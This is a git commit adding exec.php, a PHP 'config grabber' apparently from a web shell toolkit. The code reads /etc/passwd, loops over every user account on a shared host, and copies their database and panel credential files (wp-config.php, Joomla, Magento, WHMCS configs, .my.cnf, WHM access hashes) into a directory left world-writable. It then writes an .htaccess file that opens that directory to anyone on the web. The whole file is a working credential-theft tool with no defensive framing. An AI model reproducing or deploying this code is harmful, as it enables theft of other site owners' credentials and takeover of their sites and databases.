44ae8b773b6bb00a637b85ac2ba57572987f076f
Ubaii <31325580+Ubaii@users.noreply.github.com>
2019-10-09 11:08:12 +0700

    Create exec.php

---
+++ exec.php
@@ -0,0 +1,56 @@
+    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
+    $idx = mkdir("idx_config", 0777);
+    $isi_htc = "Options all\nRequire None\nSatisfy Any";
+    $htc = fopen("idx_config/.htaccess","w");
+    fwrite($htc, $isi_htc);
+    while($passwd = fgets($etc)) {
+        if($passwd == "" || !$etc) {
+            echo "<font color=red>Can't read /etc/passwd</font>";
+        } else {
+            preg_match_all('/(.*?):x:/', $passwd, $user_config);
+            foreach($user_config[1] as $user_idx) {
+                $user_config_dir = "/home/$user_idx/public_html/";
+                if(is_readable($user_config_dir)) {
+                    $grab_config = array(
+                        "/home/$user_idx/public_html/include/database.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/include/configuration.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/include/db.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/include/config.php" => "Tidak diketahui.",
+                        "/home/$user_idx/public_html/mysql.connect.php" => "Yii CMS",
+                        "/home/$user_idx/public_html/mysql.connection.php" => "Yii CMS",
+                        "/home/$user_idx/.cpanel/contactinfo" => "CP Crack",
+                        "/home/$user_idx/.my.cnf" => "cpanel",
+                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
+                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
+                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
+                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
+                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
+                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
+                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
+                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
+                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
+                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
+                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
+                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
+                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
+                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
+                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
+                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
+                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
+                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
+                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
+                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
+                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
+                    foreach($grab_config as $config => $nama_config) {
+                        $ambil_config = file_get_contents($config);
+                        if($ambil_config == '') {
+                        } else {
+                            $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
+                            fputs($file_config,$ambil_config);
+                        }
+                    }
+                }      
+            }
+        }  
+    }
+    echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
